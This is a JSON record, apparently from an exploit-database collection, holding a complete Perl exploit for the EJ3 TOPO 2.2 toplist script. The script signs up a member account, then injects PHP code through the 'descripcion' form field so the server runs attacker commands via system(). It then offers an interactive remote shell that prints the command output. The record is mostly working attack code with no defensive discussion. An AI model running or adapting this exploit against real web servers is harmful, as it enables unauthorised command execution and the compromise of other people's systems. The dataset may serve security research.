{
  "id": "2002",
  "title": "EJ3 TOPo 2.2 - &#039;descripcion&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# EJ3 TOPO  2.2 Remote Code Execution Exploit\r\n# --------------------------------------------- \r\n# Note : This Exploit Just run TOPO 2.2\r\n# IHST : www.Hackerz.Ir \r\n# AST  : www.aria-security.net\r\n###### (C)oded & Discovered By Hessam-x\r\n\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\nuse HTTP::Cookies;\r\n\r\n\r\n $host = $ARGV[0];\r\n\r\n $url = \"http://\".$host;\r\n\r\n&hed;\r\n    print \" [~] Host : $host \\n\";\r\n    print \" [~] Conecting ...\\n\";\r\n\r\n\r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n $xpl->cookie_jar( $cookie_jar );\r\n \r\n $res = $xpl->post($url.'index.php',\r\n Content => [\r\n \"email\"   => \"info@yahoo.com\",\r\n \"web\"   => \"Yahoo.Com\",\r\n \"webURL\"   => \"http://www.yahoo.com\",\r\n \"BannerURL\"   => \"http://www.yahoo.com/logo.jpg\",\r\n \"descripcion\" => \"YAHOO!INC\",\r\n \"country\" => \"as\",\r\n \"m\" => \"members\",\r\n \"s\" => \"html\",\r\n \"t\" => \"join\",\r\n \"paso\" => \"2\",\r\n \"ID\" => \"shell\",\r\n ],);\r\n\r\n print \" [+] Created a user ...\\n\";\r\n &run;\r\n \r\n\r\n \r\n sub hed()\r\n{\r\n print q(\r\n ###########################################################\r\n #        EJ3 TOPO <= 2.1 Remote Code Execution Exploit    #\r\n #                                                         #\r\n ############# Coded & discovered By Hessam-x ##############\r\n\r\n);\r\n\r\n \r\n if (@ARGV < 1) {\r\n print \" #  usage : hx.pl [host&path]\\n\"; \r\n print \" #  E.g : hx.pl www.milw0rm.com/toplist/\\n\"; \r\n  exit();\r\n }\r\n \r\n} \r\n \r\n    while ()\r\n{\r\n    &run\r\n    }\r\n  sub run()\r\n {  \r\n\r\n      print \"\\n[Shell]\\$\";\r\n      chomp($exc=<STDIN>);\r\n    \r\n        exit() if ($exc eq 'exit');\r\n\r\n \r\n \r\n  $commd = \"system(\\\"$exc\\\")\";\r\n  $cmd  = 'echo 1 ; echo _START_ ; '.$commd.' ; echo _END_';\r\n\r\n\r\n $req = $xpl->post($url.'index.php',\r\n Content => [\r\n \"passwordNEW\" => \"0\",\r\n \"email\"   => \"info@yahoo.com\",\r\n \"webURL\"   => \"http://www.yahoo.com\",\r\n \"BannerURL\"   => \"http://www.yahoo.com/logo.jpg\",\r\n \"descripcion\" => \"YAHOO!INC' ;  $cmd ; ?>//\",\r\n \"country\" => \"unknow\",\r\n \"m\" => \"members\",\r\n \"s\" => \"html\",\r\n \"t\" => \"edit\",\r\n \"paso\" => \"2\",\r\n \"password\" => \"0\",\r\n \"ID\" => \"shell\",\r\n ],);\r\n $res = $xpl->get($url.'index.php?m=top&s=out&ID=shell');\r\n @result = split(/\\n/,$res->content);\r\n $runned = 0;\r\n $on = 0;\r\n print \"\\n\";\r\n for $res(@result)\r\n  {\r\n    if ($res =~ /^_END_/) { print \"\\n\"; return 0; }\r\n    if ($on == 0) { print \"  $res\\n\"; }\r\n    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } \r\n  }\r\n    if (!$runned) { print \"Can not execute command . EXPLOIT FAILED !\\n\" ; };\r\n   \r\n  \r\n  \r\n  }\r\n\r\n# milw0rm.com [2006-07-10]",
  "url": "https://www.exploit-db.com/exploits/2002"
}